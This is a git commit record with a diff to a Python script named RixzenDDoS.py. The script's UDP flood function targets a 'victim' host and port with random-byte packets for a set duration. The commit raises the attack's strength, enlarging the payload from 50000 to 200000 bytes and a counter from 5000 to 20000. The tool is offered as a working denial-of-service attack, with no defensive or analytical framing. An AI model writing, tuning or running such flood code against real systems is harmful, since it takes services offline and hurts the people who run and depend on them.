d6921ce0dbf6a02d59a10e4c6cbf3ee4051323a1
MathoCraft <37491414+MathoCraft@users.noreply.github.com>
2021-08-12 12:09:29 +0700

    Add files via upload

--- RixzenDDoS.py
+++ RixzenDDoS.py
@@ -14,9 +14,9 @@ def usage():
     print "#######################################################################"
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(50000)
+    bytes = random._urandom(200000)
     timeout =  time.time() + duration
-    sent = 5000
+    sent = 20000
     while 1:
         if time.time() > timeout:
             break
